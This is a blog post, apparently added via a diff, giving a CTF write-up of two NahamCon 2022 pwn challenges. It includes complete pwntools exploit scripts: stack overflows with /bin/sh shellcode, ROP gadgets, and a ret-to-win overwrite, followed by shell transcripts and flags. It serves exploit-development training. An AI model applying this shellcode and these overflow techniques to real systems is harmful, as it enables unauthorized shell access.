@@ -1,0 +1,162 @@
+---
+layout: post
+title: NahamCon CTF 2022
+author: Kolja
+categories: [CTF]
+tags: [pwn]
+---
+
+## Pwn
+### Babysteps
+Babysteps was an easy challenge, that did not have stack canaries or NX activated:
+```
+checksec --file=babysteps  
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   59) Symbols       No    0               1               babysteps
+
+```
+
+Therefore it is possible to overwrite eip with and jump to our shellcode. To make this more reliable we can use a `jmp eax` gadget which exists in the executable, as `eax` contained the address of our shellcode. Additionally there is also a gadget, that allows us to ensure, that our shellcode does not interfere with it self by overwriting data on the stack:
+```
+ROPgadget --binary babysteps  
+Gadgets information
+============================================================
+[...]
+0x0804901b : add esp, 8 ; pop ebx ; ret
+[...]
+0x08049545 : jmp eax
+[...]
+Unique gadgets found: 270
+```
+
+To exploit this we used the following script:
+```
+#!/usr/bin/env python
+# coding: utf-8
+import sys
+import time
+
+from pwn import *
+
+def main(args):
+    p = None
+    # toggle to remote with ./pwn.py remote
+    if len(args) == 2 and args[1] == "remote":
+        p = remote("challenge.nahamcon.com",  32540)
+    else:
+        p = process("./babysteps")
+        #p = gdb.debug("./babysteps")
+    # Receive until we can send our exploit
+    p.recvuntil(b"First, what is your baby name?")
+    # offset to eip
+    offset = 28
+    # Shellcode for dropping a shell
+    shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+    # jmp eax gadget (eax points to our shellcode)
+    gadget = 0x08049545
+    # increase esp by 12 gadget 
+    gadget_esp = 0x0804901b
+    # building exploit out of the following parts:
+    # 1) Shellcode
+    # 2) Filler data until offset
+    # 3) gadget, that increases esp, so that our shellcode does not interfere with itself
+    # 4) jmp eax gadget, that jumps to our shellcode
+    exploit = shellcode + b"\x90" * (offset - len(shellcode)) + p32(gadget_esp) + b"\x90" * 12 + p32(gadget)
+    # Sending the exploit
+    p.sendline(exploit)
+    # Hopefully drop shell here
+    p.interactive()
+    # Note that if your program never ends, you will never see any output
+    print(p.recvall())
+    sys.exit(0)
+
+if __name__ == "__main__":
+        main(sys.argv)
+
+```
+
+This gave us the following ouput:
+```
+python3 babysteps.py remote
+[+] Opening connection to challenge.nahamcon.com on port 32540: Done
+[*] Switching to interactive mode
+
+$ whoami
+challenge
+$ ls
+babysteps
+bin
+dev
+etc
+flag.txt
+lib
+lib32
+lib64
+libx32
+usr
+$ cat flag.txt
+flag{7d4ce4594f7511f8d7d6d0b1edd1a162}
+```
+
+### Babiersteps
+Babiersteps was an easy challenge, that did have NX enabled:
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69) Symbols       No    0               0               babiersteps
+```
+
+There is however a `win` function present and there are no stack canaries. The following script was used to solve the challenge:
+```
+#!/usr/bin/env python
+# coding: utf-8
+import sys
+import time
+
+from pwn import *
+
+def main(args):
+    p = None
+
+    # toggle to remote with ./pwn.py remote
+    if len(args) == 2 and args[1] == "remote":
+        p = remote("challenge.nahamcon.com", 31583)
+    else:
+        p = process("./babiersteps")
+        #p = gdb.debug("./babysteps")
+    # Receive until we can send our exploit
+    p.recvuntil(b"Everyone has heard of gets, but have you heard of scanf?")
+    # offset of eip
+    offset = 120
+    # Our Exploit
+    # 1) Filler data until we reach the return address
+    # 2) Address of the win function
+    p.sendline(b"\x90" *120 + p64(0x4011c9))
+    # Hopefully drop shell here
+    p.interactive()
+    # Note that if your program never ends, you will never see any output
+    print(p.recvall())
+    sys.exit(0)
+
+if __name__ == "__main__":
+        main(sys.argv)
+```
+
+This gave us the following output:
+```
+$ whoami
+challenge
+$ ls
+babiersteps
+bin
+dev
+etc
+flag.txt
+lib
+lib32
+lib64
+libx32
+usr
+$ cat flag.txt
+flag{4dc0a785da36bfcf0e597917b9144fd6}
+[*] Got EOF while reading in interactive
+```
